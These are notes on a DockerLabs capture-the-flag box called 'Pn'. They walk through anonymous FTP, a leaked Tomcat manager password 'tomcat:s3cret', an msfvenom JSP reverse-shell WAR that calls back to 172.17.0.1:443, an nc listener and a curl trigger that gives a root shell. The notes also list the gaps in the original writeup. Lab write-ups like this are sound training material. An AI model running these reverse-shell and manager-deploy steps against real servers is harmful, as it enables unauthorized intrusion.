---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, ftp, whatweb, gobuster, curl, netcat, metasploit]
techniques: [information-gathering, ftp-anonymous-login, directory-fuzzing, hardcoded-credentials, web-shell-upload, reverse-shells, tomcat-manager-war-deploy]
tags: [ejpt:assessment, ejpt:web-pentest]
related: ["[[hiddencat]]", "[[file]]", "[[anonymous-pingu]]"]
---

# Pn

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/pn.md)

A Tomcat box that reads like the manager-route answer sheet [[hiddencat]] never wrote: a 74-byte FTP note names the user, a `grep` on `/manager/html` hands over the legendary `tomcat:s3cret`, and a WAR deployed through the manager's own feature returns a shell — `whoami` → **root** on the first try, because the Tomcat service itself runs as root. *"No privilege escalation but direct root shell"*: the missing privesc stage is not an omission, it's the finding.

## Path

1. **Recon** — `ping -c 2` + `sudo nmap -p- --open -sS --min-rate 5000 -n -Pn` → **21** (ftp) + **8080** (http-proxy). The version pass (`-p21,8080 -sS -sCV -T4`) fills in **vsftpd 3.0.5** and **Apache Tomcat 9.0.88** — and the `ftp-anon` script does the FTP's job *before you touch the service*:

   ```
   | ftp-anon: Anonymous FTP login allowed (FTP code 230)
   |_rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt
   ```

   The scan already told you both halves: anonymous works, and there is exactly one file — `tomcat.txt`, 74 bytes. Read `-sC` output before opening a session ([[information-gathering]], [[ftp-anonymous-login]], [[nmap]]).
2. **Anonymous FTP** — `ftp 172.17.0.2` → `anonymous`/blank → `ls` confirms the same single file → `get tomcat.txt` → `cat`:

   ```
   Hello tomcat, can you configure the tomcat server? I lost the password...
   ```

   A narrative hint addressing its subject: **tomcat** is the username — same hint-derived-username class as [[winfake]] and [[los40ladrones]] — except no wordlist follows, because the password arrives from a *different service* ([[ftp-anonymous-login]], [[ftp]]).
3. **Fingerprint** — `whatweb http://172.17.0.2:8080` → `[200 OK] … Title[Apache Tomcat/9.0.88]`, confirming nmap's banner with an independent request ([[whatweb]]).
4. **Directory fuzz** — `gobuster dir` (DirBuster medium, `-x php,html,txt`) → **three hits, all 302**: `docs`, `examples`, `manager`, each `[--> /…/]` (Tomcat's slash-normalization for its default apps). The exact triple [[hiddencat]] found and abandoned — this time `manager/` gets followed ([[directory-fuzzing]], [[gobuster]]).
5. **The credential leak** —

   ```sh
   curl -s http://172.17.0.2:8080/manager/html | grep 'username'
   &lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
   ```

   **`tomcat:s3cret`** — the famous Tomcat default pair, `manager-gui` role included, arriving in the response to an apparently unauthenticated request (and arriving HTML-*escaped*, as the entities show). What `/manager/html` actually returned — status code, headers, full body — is never on record ([[hardcoded-credentials]], [[tomcat-manager-war-deploy]]).
6. **Payload WAR** — a WAR is a zipped Java webapp; a JSP inside it executes server-side:

   ```sh
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.2 LPORT=443 -f war > reverse.war
   Payload size: 1085 bytes
   Final size of war file: 1085 bytes
   ```

   **LHOST is the box itself** — a payload dialing home to its own IP never calls back. The build was quietly redone with the attacker IP (the discard is never acknowledged):

   ```sh
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war > reverse.war
   Payload size: 1093 bytes
   Final size of war file: 1093 bytes
   ```

   msfvenom **randomizes the JSP name** per build: the dead first build showed it via `strings reverse.war | grep jsp` → `hsblzacw.jsp`; the rebuilt one via `unzip reverse.war`:

   ```
   inflating: WEB-INF/web.xml
   inflating: bkgpzpphcpi.jsp
   ```

   You cannot curl what you cannot name ([[metasploit]], [[web-shell-upload]], [[tomcat-manager-war-deploy]]).
7. **Listener + trigger** — `sudo nc -lvnp 443` (sudo for a port below 1024), then fire the JSP at the context path — **the context path is the WAR's basename** (`reverse.war` → `/reverse/`):

   ```sh
   curl http://172.17.0.2:8080/reverse/bkgpzpphcpi.jsp
   ```

   ```
   connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 47162
   whoami
   root
   ```

   **No privilege escalation but direct root shell** — the Tomcat service runs as root, so the first shell already *is* root: no `sudo -l`, no SUID hunt, no capability sweep, and no flags hunted for ([[reverse-shells]], [[tomcat-manager-war-deploy]]).

## Credentials / secrets

| Secret | Where it came from |
|--------|--------------------|
| `tomcat` (username) | 74-byte anonymous-FTP note `tomcat.txt`: *"Hello tomcat, can you configure the tomcat server? I lost the password..."* |
| `tomcat:s3cret` | `grep username` on the `/manager/html` response — the classic Tomcat default pair, `manager-gui` role (leak mechanism unexplained, see gaps) |

## Takeaways

- **The scan already handed you the file.** The `ftp-anon` NSE script logged in, listed the root, and printed `tomcat.txt` (74 B) in `-sC` output before any interactive session existed — the FTP login was just the `get`. Recon is not a port list: scripts do *work* for you, so read their output as data, not as a boolean ([[information-gathering]], [[ftp-anonymous-login]], [[nmap]]).
- **A 74-byte note can be the entire user enumeration.** *"Hello tomcat…"* names its addressee — the same hint-derived-username class as [[winfake]] (CSS leak) and [[los40ladrones]] (riddle), but cheaper: no brute-force runs at all, because the password arrives from the web side of the box ([[ftp-anonymous-login]], [[hardcoded-credentials]]).
- **`tomcat:s3cret` is the industry's most famous default — and it fell out of a `grep`.** The command is on record; the *mechanism* is not. An unauthenticated request to `/manager/html` had no business carrying `tomcat-users.xml` content, and the response's status, headers, and full body were never captured. Record the command honestly, keep the "why did this work?" question open ([[hardcoded-credentials]]).
- **Manager WAR deploy is a feature, not a CVE** — the same two-door fork [[hiddencat]] faced: that box took CVE-2020-1938 (AJP file read) and left `manager/` shut; this box opened `manager/` and never needed a CVE. Same product family, opposite route — this is the payoff of the door [[hiddencat]] left unopened ([[tomcat-manager-war-deploy]]).
- **Unzip the WAR before you curl it.** msfvenom randomizes the JSP name every build (`bkgpzpphcpi.jsp`), so the payload is unnameable until you look inside — `unzip` (or `strings | grep jsp`) — and the trigger path is fixed by convention: **context path = WAR basename** (`reverse.war` → `/reverse/<random>.jsp`) ([[web-shell-upload]], [[reverse-shells]]).
- **LHOST must be YOU.** First build pointed at `172.17.0.2` — the box itself — and was rebuilt to `172.17.0.1`, the attacker. A payload that dials itself never calls back; treat `LHOST=` as a two-way check (*whose IP is this?*) on every payload ([[metasploit]]).
- **No privesc stage = the service runs as root.** `whoami` on the first shell is `root`: no sudo, no SUIDs, no capabilities — because there was nothing to escalate *from*; you started at uid 0. The missing stage points at the real misconfiguration: **Tomcat should never run as root**. And note what *else* is missing: no flag paths appear anywhere, even in a root shell.

## Gaps in the writeup

- **The deploy step itself never appears.** The record is msfvenom → unzip → curl: no upload command, no manager UI action, no HTTP deploy call for the box's *central* action. The WAR reaching `/reverse/` is inferred from the context path, never demonstrated.
- **The credential leak is asserted, not explained.** `curl -s …/manager/html | grep 'username'` returned HTML-*escaped* user-table content (`&lt;user username="tomcat" …/&gt;`) from a request that shows no authentication — no status code, no headers, no full response. *Why* an unauthenticated request embedded `tomcat-users.xml` content (custom error page? misconfigured valve? reflection?) is unknown.
- **No flags anywhere** — no `user.txt`/`root.txt` path appears in the transcript, and no flag hunt is attempted even as root.
- **The root claim is one word deep** — `whoami` only. No `id`, no `ps`/`/proc` check of the Tomcat process's uid; "the service runs as root" is a reasonable inference, not verified evidence.
- **The first payload's discard was never acknowledged** — the `LHOST=172.17.0.2` build (and its `hsblzacw.jsp` strings output) just sits in the transcript with no note of why it was rebuilt.
- **vsftpd 3.0.5 never researched** — the banner was recorded and dropped, with no CVE/version lookup on record (contrast the lookup reflex taught on [[hiddencat]]).
- **`docs/` and `examples/` were never explored** — the other two 302s were fuzzed and abandoned; only `manager/` got followed.
- **Only one FTP file, ever.** `ls` showed `tomcat.txt` and nothing more: no `mget *`, no parent-directory walk, and no `put` test — anonymous **write** access was never checked.
